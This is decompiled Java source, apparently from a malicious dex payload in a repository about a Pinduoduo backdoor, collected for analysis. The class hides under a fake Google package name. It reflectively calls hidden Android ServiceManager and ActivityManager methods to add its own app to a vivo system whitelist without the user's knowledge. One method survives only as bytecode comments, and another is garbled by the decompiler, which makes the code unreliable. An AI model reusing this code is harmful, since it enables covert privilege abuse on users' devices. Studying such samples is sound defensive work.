package com.google.android.sd.biz_dynamic_dex.vivo_base;

import android.content.Context;
import android.os.IBinder;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

public class AmsConfigUtil {
  private static List<String> getAmsDoubleInstanceConfig() {
    // Byte code:
    //   0: ldc 'android.app.IActivityManager$Stub'
    //   2: invokestatic getClassForName : (Ljava/lang/String;)Ljava/lang/Object;
    //   5: astore_2
    //   6: ldc java/lang/Class
    //   8: ldc 'getMethods'
    //   10: iconst_0
    //   11: anewarray java/lang/Class
    //   14: invokevirtual getMethod : (Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;
    //   17: astore_3
    //   18: aload_3
    //   19: iconst_1
    //   20: invokevirtual setAccessible : (Z)V
    //   23: aload_3
    //   24: aload_2
    //   25: iconst_0
    //   26: anewarray java/lang/Object
    //   29: invokevirtual invoke : (Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    //   32: checkcast [Ljava/lang/reflect/Method;
    //   35: astore_2
    //   36: aload_2
    //   37: arraylength
    //   38: istore_1
    //   39: iconst_0
    //   40: istore_0
    //   41: iload_0
    //   42: iload_1
    //   43: if_icmpge -> 203
    //   46: aload_2
    //   47: iload_0
    //   48: aaload
    //   49: astore #4
    //   51: aload #4
    //   53: invokevirtual getName : ()Ljava/lang/String;
    //   56: ldc 'asInterface'
    //   58: invokevirtual equals : (Ljava/lang/Object;)Z
    //   61: ifeq -> 196
    //   64: aload #4
    //   66: aconst_null
    //   67: iconst_1
    //   68: anewarray java/lang/Object
    //   71: dup
    //   72: iconst_0
    //   73: ldc 'activity'
    //   75: invokestatic getServiceIbinder : (Ljava/lang/String;)Landroid/os/IBinder;
    //   78: aastore
    //   79: invokevirtual invoke : (Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    //   82: astore_2
    //   83: goto -> 86
    //   86: aload_3
    //   87: aload_2
    //   88: invokevirtual getClass : ()Ljava/lang/Class;
    //   91: iconst_0
    //   92: anewarray java/lang/Object
    //   95: invokevirtual invoke : (Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    //   98: checkcast [Ljava/lang/reflect/Method;
    //   101: astore #4
    //   103: aload #4
    //   105: ifnonnull -> 110
    //   108: aconst_null
    //   109: areturn
    //   110: aload #4
    //   112: arraylength
    //   113: istore_1
    //   114: iconst_0
    //   115: istore_0
    //   116: iload_0
    //   117: iload_1
    //   118: if_icmpge -> 215
    //   121: aload #4
    //   123: iload_0
    //   124: aaload
    //   125: astore_3
    //   126: aload_3
    //   127: invokevirtual getName : ()Ljava/lang/String;
    //   130: ldc 'getDoubleInstanceConfig'
    //   132: invokevirtual equals : (Ljava/lang/Object;)Z
    //   135: ifeq -> 208
    //   138: goto -> 217
    //   141: aload_3
    //   142: aload_2
    //   143: iconst_1
    //   144: anewarray java/lang/Object
    //   147: dup
    //   148: iconst_0
    //   149: iconst_1
    //   150: invokestatic valueOf : (I)Ljava/lang/Integer;
    //   153: aastore
    //   154: invokevirtual invoke : (Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    //   157: checkcast java/util/List
    //   160: astore_2
    //   161: aload_2
    //   162: invokeinterface iterator : ()Ljava/util/Iterator;
    //   167: astore_3
    //   168: aload_3
    //   169: invokeinterface hasNext : ()Z
    //   174: ifeq -> 191
    //   177: aload_3
    //   178: invokeinterface next : ()Ljava/lang/Object;
    //   183: checkcast java/lang/String
    //   186: astore #4
    //   188: goto -> 168
    //   191: aload_2
    //   192: areturn
    //   193: astore_2
    //   194: aconst_null
    //   195: areturn
    //   196: iload_0
    //   197: iconst_1
    //   198: iadd
    //   199: istore_0
    //   200: goto -> 41
    //   203: aconst_null
    //   204: astore_2
    //   205: goto -> 86
    //   208: iload_0
    //   209: iconst_1
    //   210: iadd
    //   211: istore_0
    //   212: goto -> 116
    //   215: aconst_null
    //   216: astore_3
    //   217: aload_3
    //   218: ifnonnull -> 141
    //   221: aconst_null
    //   222: areturn
    // Exception table:
    //   from	to	target	type
    //   0	39	193	java/lang/Exception
    //   51	83	193	java/lang/Exception
    //   86	103	193	java/lang/Exception
    //   110	114	193	java/lang/Exception
    //   126	138	193	java/lang/Exception
    //   141	168	193	java/lang/Exception
    //   168	188	193	java/lang/Exception
  }
  
  private static Object getClassForName(String paramString) {
    try {
      return Class.class.getDeclaredMethod("forName", new Class[] { String.class }).invoke(null, new Object[] { paramString });
    } catch (Exception exception) {
      return null;
    } 
  }
  
  private static IBinder getServiceIbinder(String paramString) {
    try {
      Method method = Class.class.getDeclaredMethod("forName", new Class[] { String.class });
      return (IBinder)((Method)Class.class.getMethod("getMethod", new Class[] { String.class, Class[].class }).invoke(method.invoke(null, new Object[] { "android.os.ServiceManager" }), new Object[] { "getService", { String.class } })).invoke(null, new Object[] { paramString });
    } catch (Exception exception) {
      return null;
    } 
  }
  
  public static boolean resetList(Context paramContext) {
    List<String> list = getAmsDoubleInstanceConfig();
    if (list == null)
      return false; 
    if (list.contains(paramContext.getPackageName())) {
      list.remove(paramContext.getPackageName());
      return setAmsDoubleInstanceConfig(new ArrayList<String>(list));
    } 
    return false;
  }
  
  private static boolean setAmsDoubleInstanceConfig(ArrayList<String> paramArrayList) {
    Object object;
    Method method;
    try {
      object = getClassForName("android.app.IActivityManager$Stub");
      method = Class.class.getMethod("getMethods", new Class[0]);
      method.setAccessible(true);
      object = method.invoke(object, new Object[0]);
      int j = object.length;
      int i = 0;
      while (true) {
        Method method1 = null;
        if (i < j) {
          Object object1 = object[i];
          if (object1.getName().equals("asInterface")) {
            object = object1.invoke(null, new Object[] { getServiceIbinder("activity") });
          } else {
            i++;
            continue;
          } 
        } else {
          object = null;
        } 
        Method[] arrayOfMethod = (Method[])method.invoke(object.getClass(), new Object[0]);
        if (arrayOfMethod == null)
          return false; 
        j = arrayOfMethod.length;
        i = 0;
        while (true) {
          method = method1;
          if (i < j) {
            method = arrayOfMethod[i];
            if (method.getName().equals("setDoubleInstanceConfig"))
              break; 
            i++;
            continue;
          } 
          break;
        } 
        break;
      } 
    } catch (Exception exception) {
      return false;
    } 
    if (method == null)
      return false; 
    HashMap<Object, Object> hashMap = new HashMap<Object, Object>();
    hashMap.put("SupportedAppPackageName", exception);
    method.invoke(object, new Object[] { Boolean.valueOf(true), hashMap });
    return true;
  }
  
  public static boolean updateWhiteList(Context paramContext) {
    List<String> list = getAmsDoubleInstanceConfig();
    if (list == null)
      return false; 
    if (list.contains(paramContext.getPackageName()))
      return true; 
    list.add(paramContext.getPackageName());
    return setAmsDoubleInstanceConfig(new ArrayList<String>(list));
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\be7a2b643d7e8543f49994ffeb0ee0b6-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\vivo_base\AmsConfigUtil.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */